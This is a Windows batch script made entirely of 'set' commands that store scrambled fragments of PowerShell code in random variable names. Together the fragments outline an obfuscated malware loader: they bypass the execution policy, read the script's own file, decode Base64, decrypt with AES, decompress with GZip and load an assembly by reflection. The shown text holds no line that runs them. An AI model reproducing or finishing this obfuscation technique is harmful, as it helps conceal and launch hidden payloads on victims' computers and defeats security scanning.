@echo off
set "kezfrlGNbI=Ugdp"
set "oyYYsDNHaw=ewLi"
set "KEQNcytGtJ=F'[-"
set "JjJjHFVtqm=R5jf"
set "ouxgKdZcoM=ress"
set "HOyInpnSao=tem."
set "sBaVybTQvG=pose"
set "tALNarxmxM=::De"
set "DuUDbVdVId=$WhJ"
set "yqUELBKBMO=)))"
set "qZtIPcGrjg=morF"
set "xHFIcCElAg=ck($"
set "IEssahxykc=urit"
set "nVVOlMvVdU=6esa"
set "hzzNUhLDqH='')("
set "NSaCTjTmDA=G = "
set "jIroppNWqp=Ugdp"
set "kYkszHRSiS===')"
set "YRSCrZdHHg=Mode"
set "OphgkajShL=]::N"
set "WYOlbRCaFC== $Q"
set "uxxJIXnYBu=nirt"
set "cnqCigQBTZ=WhJm"
set "GPACfJvycn=bypa"
set "hqjWXnVWiu=ct S"
set "eNNRPcvnao=M, 0"
set "CYxvWAgVzx= '')"
set "eXJITyCCDV=bjYY"
set "RezdQgQeNi=gMod"
set "qkUxZMNEKM=yste"
set "isYgDGKbbd=T.En"
set "GYLhLoRDEA=null"
set "zIUTeGYnXY=]::("
set "ZBlJvftFQu=tjpE"
set "BIAVKDIJKJ='[-1"
set "IneYCIHvQo=A = "
set "rXExqbfmzy=;$dj"
set "FfJIIaeJqU=Comp"
set "IuRkYdGOlf='txe"
set "RBIWsizbcC=$djk"
set "NGGxCZjQnI=, $W"
set "ryxmcnwJHf=DNJS"
set "yuGFUZDswZ=Star"
set "rvXKMvruNg=yTo("
set "uqTfxWlumP=();$"
set "tRcfdlTCwl=BC;$"
set "NznzHDtJfl=BYpG"
set "xZTQBPUmOG=THxh"
set "mcOWBUGRJy=raph"
set "dtLBLEMYdz=QJgQ"
set "BFYlmOJAuN=trea"
set "HfimCZCURB=pres"
set "bBjmxJLEkH=comm"
set "jllsJpJWFf=7kGw"
set "acIEwXZwny=y]::"
set "DTVnDeRWLf=)($E"
set "waaDQCLEiB=[Sys"
set "VbWpvWHFgA=yste"
set "lybzmObMXO=ert]"
set "AmXNgAEuja=form"
set "jwGlQuHXSH=.Dis"
set "zJdiDfGnev=YS ="
set "JZOKiGLSwu=rans"
set "urTNBIDJoS=IND "
set "KVlZJPgXyg=$bpu"
set "MJdbWgRBTJ=ptog"
set "bjWpkuJtWR= = ["
set "wnkZaOVCDI=$bpu"
set "ZtGJCjOXBs=m.IO"
set "BFzgMIDpse=rofi"
set "dSvrBmXrOM=MET "
set "WzzhxjlfLm=Obje"
set "AvturRiBCg=ew-O"
set "pNkTofgtyQ=('%~f0'"
set "cvBhxUqeXW=1] -"
set "smqaCsFqCh=bstr"
set "jbthfYqQlr=lit("
set "wwKONxkcHl=ress"
set "zYvPXtssjp=m(, "
set "inTvmODZzh=embl"
set "VKgOgYacSB=hy.A"
set "MESMhVNvYg= New"
set "kikQbqNbfN=ode]"
set "uCfIpIyXDe=::('"
set "gsXVkpqfAD=t Sy"
set "lGNUbXDiXc=16] "
set "rpyuIKTOSa=.Len"
set "fPgwKBUxid=1..-"
set "rAFMiykAKw=M = "
set "WBGxmhMZyN=y.Ci"
set "AdaZQiQTdX=y.Cr"
set "DxkruzVgYV=esMa"
set "zseNLcSDrt=; };"
set "UpOUlLShuH=)) {"
set "BaUKcCxMES=();$"
set "eessxYvhFo=p.Pa"
set "WbTnYnGIzL=esaB"
set "UHwiDzAWsq=Disp"
set "tiSJqgxhpV=gnir"
set "nEMOqYhDxh=).Sp"
set "CZzIZwrPCa=.Com"
set "TjqVjmTCGy=tgkz"
set "HukyoRlWVo=]::("
set "OGqNCBPyaK=eam("
set "wHyhnpxlvU=stem"
set "lYWYBnFuZI=pG.D"
set "AMdrLOSSPs=($vN"
set "YiWOUkuRiz=.-16"
set "RNVJKMvEEJ=[Sys"
set "uqvmbCDJMh=);$j"
set "eVZVrdSCJY=  $E"
set "ziMIvoWTcC=ose("
set "uCnbHiiTvJ=raph"
set "zCUeKhLyem=yste"
set "hmYhXyilPR=kPh."
set "CnlMXlfQGG=Comp"
set "nqwofqayWz=zA, "
set "mpAiUSciAB=zm83"
set "BWJXIwsIsF=ct S"
set "AzhOrsBDNl=$BBY"
set "kObUhGfGkT=ose("
set "kqwYFeUipS=hJmM"
set "ClIkxFcNHz=ay()"
set "tptMJjOkvZ=3); "
set "JpWcDiNGWO=oj);"
set "oskmOjxyYs=am;$"
set "jmLczBqBEt=oj.T"
set "YATJMyyJgI=File"
set "OCZHHEUMIa=Ph.T"
set "JDVgbxcUgv=d;$Q"
set "aqjyKgqIPl=Secu"
set "vqPhAlBufN=.Con"
set "PLqOtOXXMi=Conv"
set "jwrRncGUNV=Obje"
set "HGrjKhGwha=S) {"
set "hFTCGqWmEA=oin "
set "IAtQbofkdm=);$b"
set "qUwcYWKIkd='[-1"
set "dxSsPIehMN=-joi"
set "Qinudyncee=nage"
set "QUJcOBYrHu=tion"
set "qSGYetjqRG=stem"
set "fMqIsjGHTj= = $"
set "xMLuKwdufE=);$Q"
set "jdSGMJbeHH=$WhJ"
set "MyJnJiwyZs=('da"
set "neeLVgpdJe= '')"
set "cRUUWemVLF=-ep "
set "fBkwVRAOCC=g = "
set "EzHnXVOPuO=TllA"
set "njWmVKDFLd=-4] "
set "NyrJABrmHf=FcNh"
set "VglKrXEBFU== [S"
set "DGowcgZUcg=V = "
set "FDKIpeHgcw=('%*'"
set "RIzbZKPqIk=m.Re"
set "ZMGBUntdOq=ment"
set "YYpCMJAYdL=stem"
set "hqlmssTggv=gth)"
set "PgSAAQrgjP=JgQ."
set "XfurlTHjtF= if "
set "IefuqsEcyP=.Cry"
set "WYXiqDboQa=oL'["
set "fvXnATekFm=Disp"
set "ZNiGYPtLmD=rity"
set "CRMBFETPjp=rt]:"
set "NzPgMbNYuk=BBYp"
set "teChSUsepU=);$Q"
set "ohnIrIJeMV=HO3I"
set "BmbgIlQiJP=y.Pa"
set "vLuBGmkJss=Ugdp"
set "fbfskyoVjQ=IND."
set "NaGfHClSxi=('ev"
set "FpxqmtpuhE=CuSj"
set "NqrBcUDjLB=oryS"
set "AqBAAMbXGP=ion."
set "GElZRRCxqs=mM);"
set "sPCtOxiawO=n ''"
set "atmGSAhTEH= = $"
set "GjSkeyLHkk=$tgk"
set "reahlbeznS=-joi"
set "ExRJNSNYOM=lBlo"
set "RAbPxnqVKg=kyhK"
set "WKGmANGjTk=n ''"
set "saMlwaOART=New-"
set "nDjnUKtYBp=;$tg"
set "iiJmtfqpkP=ypto"
set "zvBeVVZbgN=th('"
set "BXwHBQgJrZ=dp.I"
set "LYXNSaBepX=e = "
set "kGUoKAygBf=fore"
set "QtpcfNxLLH=.Mod"
set "wlJAUhUMaM=ing("
set "qIFbGkdFOO=]::C"
set "PMtfkbWHYJ=IoO3"
set "YPcnRxMXpB=7;$Q"
set "RUcQSWTTFY=-Obj"
set "RhwGThflNg= = N"
set "YPuUTdZNuv=8kuY"
set "PMWiXgemrr=tem."
set "PFnMgIsquX=iron"
set "KVhqTYNRbt=tem."
set "DGPAKPhWIx=comp"
